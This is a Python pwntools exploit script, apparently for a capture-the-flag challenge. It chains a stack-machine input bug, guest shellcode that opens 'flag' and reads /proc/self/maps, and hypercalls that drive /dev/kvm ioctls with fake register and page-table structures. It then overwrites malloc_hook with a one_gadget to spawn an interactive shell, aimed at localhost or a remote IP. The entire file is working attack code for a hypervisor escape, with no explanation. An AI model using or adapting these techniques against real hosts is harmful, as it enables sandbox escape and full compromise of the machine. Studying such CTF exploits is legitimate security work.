#!/usr/bin/python -i
from pwn import *
import time
import sys

context.log_level = "debug"
context.arch = "amd64"

kvm_fd = sys.argv[1] 
vm_fd  = sys.argv[2]
vcpu_fd= sys.argv[3]

payload1 = "1!0-\\"  # swap -1 to stack top.
payload2 = "." * 26  # machine points to write.
payload3 = "@@2385+@"
payload4 = "...." + "@@2107717+@,"  # 2417 to scanf

shellcode = ''

syscall = shellcraft.amd64.syscall
# length can be up to around 1000.
shellcode = asm(shellcraft.open(
    "flag", "0") + ("mov rdi,rax;mov rsi,rsp;mov rdx,80;mov rax,0;syscall;mov rdi,1;mov rsi,rsp;mov rdx,80;mov rax,1;syscall;xor edi,edi;xor eax,eax;push rsp;pop rsi;mov rdx,0x300;syscall;push rsp;ret;"))

shellcode1 = ''
shellcode1 += shellcraft.amd64.echo("Tester here....\n")
shellcode1 += syscall(constants.SYS_mmap,
                      0, 0x1100000, 3,
                      0,  # constants.MAP_PRIVATE | constants.MAP_ANONYMOUS,
                      -1, 0)
shellcode1 += 'mov rbp,rax;'
shellcode1 += syscall(constants.SYS_read, 0, 'rbp', 0x1000000)
shellcode1 += shellcraft.amd64.echo("tracetrace\n")

print shellcode1
shellcode1 = asm(shellcode1)
assert all(i not in shellcode for i in '\x09\x0a\x0b\x0c\x0d\x20')

assert len(shellcode1) < 0x300

shellcode2 = ''


def hypcall(code, arg):
    return '''
    mov eax, '''+str(arg)+'''
    mov edx, '''+str(code)+'''
    out dx , eax
    in  eax, dx
    '''

#open mapping part1
shellcode2 += hypcall(0x8000, 0x1100)  # open
shellcode2 += '''
push 0x1000
push 0x3000
push rax
'''
shellcode2 += hypcall(0x8001, 'esp')  # read
shellcode2 += '''
push 0x1000
push 0x3000
push 1
'''
shellcode2 += hypcall(0x8002, 'esp')  # write

#input shellcode !
shellcode2 += '''
push 0x1000 
push 0x1000000
push 0
'''

shellcode2 += hypcall(0x8001, "esp")


#readin fake structures to 0x30000
shellcode2 += '''
push 0x3000 
push 0x30000
push 0
'''
shellcode2 += hypcall(0x8001, 'esp') #read #input fake structures here.

#open /dev/kvm
shellcode2 += hypcall(0x8000, 0x1140)#open /dev/kvm

#ioctl to CREATE_VM
shellcode2 += '''
push 0x0
push 0xae01
push ''' + str(kvm_fd)

shellcode2 += hypcall(0x8008, "esp") #ioctl(fd,0xae01,0) CREATE_VM

#ioctl to SET_USER_MEM_REGION
shellcode2 += '''
push 0x30000
push 0x4020AE46
push ''' + str(vm_fd)

shellcode2 += hypcall(0x8008, "esp") #ioctl(fd, 0x4020ae46, 0x30000) SET_USER_MEM_REGION

#ok!

#ioctl to CREATE_VCPUFD
shellcode2 += '''
push 0
push 0xae41
push ''' + str(vm_fd)

shellcode2 += hypcall(0x8008, 'esp')  #ioctl(fd, 0xae41, 0) CREATE_VCPU_FD

#prepare fake_kvm_regs
shellcode2 += '''
push 0x1000 
push 0x40000
push 0
'''

shellcode2 += hypcall(0x8001, 'esp') #read #input fake structures here.

#commit fake_kvm_regs with ioctl 
shellcode2 += '''
push 0x40000 
push 0x4090AE82
push ''' + str(vcpu_fd)

shellcode2 += hypcall(0x8008, "esp")

#prepare page frames
shellcode2 += '''
mov rax, 0x1F8007
mov [0x80011f7000], rax
mov rax, 0x1F9007
mov [0x80011f8000], rax 
mov rax, 0x83
mov [0x80011f9000], rax 
mov rax, 0x1200083
mov [0x80011f9008] ,rax
'''

#acquire fake_kvm_sregs

shellcode2 += '''
push 0x50000 
mov rax, 0x8138AE83
push rax
push ''' + str(vcpu_fd)

shellcode2 += hypcall(0x8008, "esp") #get sregs to 0x50000

#prepare fake_kvm_sregs
shellcode2 += '''
push 0x1000 
push 0x50000
push 0
'''
shellcode2 += hypcall(0x8001, 'esp') #read input fake kvm_sregs

#prepare fake_kvm_sregs_2
shellcode2 += '''
push 0x1000 
push 0x500e0
push 0
'''
shellcode2 += hypcall(0x8001, 'esp') #read input fake kvm_sregs


#ioctl to set pagetable and segregisters!
shellcode2 += '''
push 0x50000 
push 0x4138AE84
push ''' + str(vcpu_fd)

shellcode2 += hypcall(0x8008, "esp")

#now go!
shellcode2 += '''
push 0
push 0xae80
push ''' + str(vcpu_fd)

shellcode2 += hypcall(0x8008, "esp")

#wait 
shellcode2 += '''
push 0x1000
push 0x100000
push 0
'''

shellcode2 += hypcall(0x8001, "esp")

#panic to trigger malloc!

shellcode2 += '''
mov esp, 0x100000
'''
shellcode2 += hypcall(0xffff, "esp")


shellcode2 = asm(shellcode2+'\nhlt\n').ljust(4096, '\x90')+asm('push 0; ret')
shellcode2 = shellcode2.ljust(0x1100)+'/proc/self/maps\0'
shellcode2 = shellcode2.ljust(0x1140)+'/dev/kvm\0'
payload = payload1 + payload2 + payload3 + payload4 + shellcode

if sys.argv[4] == "1":
    p = remote('127.0.0.1', 2323)
elif sys.argv[4] == '2':
    p = remote("35.200.23.198", 31733)
else:
    p = process("./hypervisor.elf kernel.bin ld.so.2 ./user.elf" ,shell=True)
p.recvuntil("down.\n")

print len(payload)
p.sendline(payload)
raw_input("continue -> (1)")

p.send(shellcode1.ljust(0x300))
raw_input("continue -> (2)")

p.send(shellcode2)

p.recvuntil('Tester here....\n')

l = p.recvuntil("\x00"*10) #acquire addresses.
temp = l.strip("\x00"*10)
print temp 
temp = temp.split("\n")
code = temp[0].split("-")[0]
vm   = temp[4].split("-")[0]
libc = temp[5].split("-")[0]
stack= temp[-5].split("-")[0]
print "code: " + code
print "vm: " + vm
print "libc: " + libc
print "stack: " + stack

#prepare shellcode
#raw_input("now gimme shellcode!")
libc = int(libc,16)
one = libc + 0x10a38c
mallochook = libc + 0x3ebc30
shellcode_final = "mov rax," + hex(one)
shellcode_final += "; mov rbx, 0x3ebc30; mov [rbx], rax"
shellcode_final += "; mov rax, 1"
shellcode_final += "; mov rbx, 0x3f0658; mov [rbx], rax"
shellcode_final += "; mov rax, " + hex(mallochook - 920)
shellcode_final += "; mov rbx, 0x3ec870; mov [rbx], rax; hlt"

raw_input("gimme shellcode: ")
p.sendline(asm(shellcode_final))
time.sleep(2)

p.recv()

#fake kmem_alias
fake_kmem =  "\x00" * 4 #slots
fake_kmem += "\x00" * 4 #flags
fake_kmem += "\x00" * 8 #guest_phys_addr
fake_kmem += p64(0x2000000) #mem_size
fake_kmem += p64(int(vm,16)+0x1000000) #target_phys_addr

print "sending fake_kmem"
p.send(fake_kmem)
time.sleep(0.5)

fake_kvm_regs =  "\x00" * 8 #rax
fake_kvm_regs += "\x00" * 8 #rbx 
fake_kvm_regs += "\x00" * 8 #rcx
fake_kvm_regs += "\x00" * 8 #rdx
fake_kvm_regs += "\x00" * 8 #rsi 
fake_kvm_regs += "\x00" * 8 #rdi
fake_kvm_regs += p64(0x1fe000) #rsp 
fake_kvm_regs += "\x00" * 8 #rbp 
fake_kvm_regs += "\x00" * 8 #r8
fake_kvm_regs += "\x00" * 8 #r9
fake_kvm_regs += "\x00" * 8 #r10
fake_kvm_regs += "\x00" * 8 #r11
fake_kvm_regs += "\x00" * 8 #r12
fake_kvm_regs += "\x00" * 8 #r13
fake_kvm_regs += "\x00" * 8 #r14
fake_kvm_regs += "\x00" * 8 #r15
fake_kvm_regs += p64(0) #rip
fake_kvm_regs += p64(2) #rflags

raw_input('prepare fake regs')
p.send(fake_kvm_regs)

raw_input("prepare fake sregs_1")

fake_kvm_sregs =  p64(0) #cs.base
fake_kvm_sregs += p64(0x010B0008FFFFFFFF) + p64(0x0000000101010000) #cs.limit
fake_kvm_sregs += p64(0) #ss.base
fake_kvm_sregs += p64(0x01030010FFFFFFFF) + p64(0x0000000101010000) #ss.limit

fake_kvm_sregs += p64(0) #gs.base
fake_kvm_sregs += p64(0x01030010FFFFFFFF) + p64(0x0000000101010000) #gs.limit
fake_kvm_sregs += p64(0) #fs.base
fake_kvm_sregs += p64(0x01030010FFFFFFFF) + p64(0x0000000101010000) #fs.limit
fake_kvm_sregs += p64(0) #es.base
fake_kvm_sregs += p64(0x01030010FFFFFFFF) + p64(0x0000000101010000) #es.limit
fake_kvm_sregs += p64(0) #ds.base
fake_kvm_sregs += p64(0x01030010FFFFFFFF) + p64(0x0000000101010000) #ds.limit
p.send(fake_kvm_sregs)

raw_input("prepare fake sregs_2")

fake_kvm_sregs = ""
fake_kvm_sregs += p64(0x80050033) #cr0
fake_kvm_sregs += p64(0) #cr2
fake_kvm_sregs += p64(0x1F7000) #cr3
fake_kvm_sregs += p64(0x26) #cr4
fake_kvm_sregs += p64(0) #cr8 
fake_kvm_sregs += p64(0x501) #efer

p.send(fake_kvm_sregs)

raw_input("now input larger than 0x4000 to trigger fprintf to malloc")

time.sleep(0.5)
p.send("a" * 0x10) #should trig?
p.interactive()

